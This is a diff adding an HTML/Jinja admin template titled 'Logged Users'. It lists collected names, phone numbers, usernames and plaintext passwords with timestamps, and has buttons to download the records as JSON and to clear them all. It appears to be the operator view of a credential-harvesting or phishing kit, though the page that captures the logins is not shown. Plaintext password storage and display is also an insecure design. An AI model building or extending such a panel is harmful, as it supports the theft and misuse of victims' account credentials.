@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Admin Panel</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <header>ADMIN PANEL — Logged Users</header>
+
+  <div style="max-width:900px;margin:20px auto;background:rgba(0,0,0,0.6);padding:15px;border-radius:8px;color:#fff;">
+    <table style="width:100%;border-collapse:collapse;color:#fff">
+      <thead>
+        <tr>
+          <th style="text-align:left;padding:8px">Name</th>
+          <th style="text-align:left;padding:8px">Phone</th>
+          <th style="text-align:left;padding:8px">Username</th>
+          <th style="text-align:left;padding:8px">Password</th>
+          <th style="text-align:left;padding:8px">Time (UTC)</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for u in users %}
+        <tr style="border-top:1px solid rgba(255,255,255,0.08)">
+          <td style="padding:8px">{{ u.name }}</td>
+          <td style="padding:8px">{{ u.phone }}</td>
+          <td style="padding:8px">{{ u.username }}</td>
+          <td style="padding:8px">{{ u.password }}</td>
+          <td style="padding:8px">{{ u.time }}</td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+
+    <div style="margin-top:15px">
+      <a href="/admin/download" style="padding:8px 12px;background:#00c6ff;color:#000;border-radius:6px;text-decoration:none;font-weight:bold">Download JSON</a>
+      <form method="post" action="/admin/clear" style="display:inline-block;margin-left:10px">
+        <button type="submit" style="padding:8px 12px;background:#ff4b4b;color:#fff;border:none;border-radius:6px;cursor:pointer">Clear All</button>
+      </form>
+    </div>
+  </div>
+
+</body>
+</html>
